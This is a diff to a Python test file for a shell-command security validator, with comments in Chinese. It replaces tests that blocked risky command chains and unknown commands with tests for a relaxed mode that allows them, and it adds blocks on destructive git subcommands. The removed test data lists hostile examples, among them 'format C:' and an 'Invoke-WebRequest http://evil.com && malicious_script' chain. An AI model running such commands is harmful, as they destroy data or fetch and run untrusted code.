@@ -138,16 +138,53 @@ class TestSecurityValidator:
             is_safe, error = validator.validate_command(cmd)
             assert is_safe is False, f"应该阻止命令：{cmd}"
 
-    def test_validate_command_dangerous_chars(self, validator):
-        """测试危险字符"""
-        dangerous_commands = [
-            "Get-Content file.txt | Remove-Item",
-            "Write-Host hello; format C:",
-            "Invoke-WebRequest http://evil.com && malicious_script",
+    def test_validate_command_allows_common_pipes_and_command_chains(self, validator):
+        """放宽模式下，常见 pipe / command chain 应允许通过。"""
+        allowed_commands = [
+            "Get-Content file.txt | Select-Object -First 20",
+            "git diff --stat | head -20",
+            "cd workspace && dir",
         ]
-        for cmd in dangerous_commands:
+        for cmd in allowed_commands:
             is_safe, error = validator.validate_command(cmd)
-            assert is_safe is False, f"应该阻止危险字符：{cmd}"
+            assert is_safe is True, f"应允许命令：{cmd} | {error}"
+
+    def test_validate_command_allows_parentheses_inside_quoted_git_message(self, validator):
+        """提交信息中的括号不应被误判为注入。"""
+        cmd = 'git commit -m "feat(prompt): add language awareness section"'
+        is_safe, error = validator.validate_command(cmd)
+        assert is_safe is True, f"带括号的 commit message 应被允许: {error}"
+
+    def test_validate_command_allows_safe_git_subcommands(self, validator):
+        """常用只读/可控 Git 子命令应被允许。"""
+        for cmd in ["git status", "git diff --stat", 'git commit -m "feat(prompt): ok"', "git add core/infrastructure/security.py"]:
+            is_safe, error = validator.validate_command(cmd)
+            assert is_safe is True, f"应允许 Git 子命令: {cmd} | {error}"
+
+    def test_validate_command_allows_function_name_inside_quoted_git_message(self, validator):
+        """提交正文中的函数名括号位于引号内时应允许。"""
+        cmd = 'git commit -m "What: add make_language_awareness_section() to prompt manager"'
+        is_safe, error = validator.validate_command(cmd)
+        assert is_safe is True, f"引号内函数名括号应被允许: {error}"
+
+    def test_validate_command_allows_semicolon_inside_quoted_git_message(self, validator):
+        """提交信息中的分号位于引号内时不应误判。"""
+        cmd = 'git commit -m "fix(prompt): keep Chinese; reduce English drift"'
+        is_safe, error = validator.validate_command(cmd)
+        assert is_safe is True, f"引号内分号应被允许: {error}"
+
+    def test_validate_command_allows_powershell_subexpression_in_relaxed_mode(self, validator):
+        """放宽模式下，PowerShell 子表达式不再因语法特征被拦截。"""
+        cmd = "Write-Host $(Get-Date)"
+        is_safe, error = validator.validate_command(cmd)
+        assert is_safe is True, error
+
+    def test_validate_command_blocks_forbidden_git_subcommands(self, validator):
+        """破坏性或高风险 Git 子命令应被拦截。"""
+        for cmd in ["git reset --hard", "git clean -fdx", "git push origin main"]:
+            is_safe, error = validator.validate_command(cmd)
+            assert is_safe is False, f"应阻止 Git 子命令: {cmd}"
+            assert "Git 子命令" in error
 
     def test_validate_command_whitelist_allowed(self, validator):
         """测试白名单允许的命令"""
@@ -164,17 +201,16 @@ class TestSecurityValidator:
             is_safe, error = validator.validate_command(cmd)
             assert is_safe is True, f"应该允许命令：{cmd}"
 
-    def test_validate_command_not_in_whitelist(self, validator):
-        """测试不在白名单的命令"""
-        unknown_commands = [
-            "Invoke-Expression 'malicious code'",
-            "Start-Process malware.exe",
-            "New-Object System.Net.WebClient",
+    def test_validate_command_relaxed_mode_allows_unknown_non_blacklisted_commands(self, validator):
+        """放宽模式下，未知但非黑名单命令默认允许。"""
+        commands = [
+            "Invoke-Expression 'echo ok'",
+            "Start-Process notepad.exe",
+            "New-Object System.Text.StringBuilder",
         ]
-        for cmd in unknown_commands:
+        for cmd in commands:
             is_safe, error = validator.validate_command(cmd)
-            assert is_safe is False, f"应该阻止未知命令：{cmd}"
-            assert "不在白名单内" in error
+            assert is_safe is True, f"应该允许命令：{cmd} | {error}"
 
 
 # ============================================================================
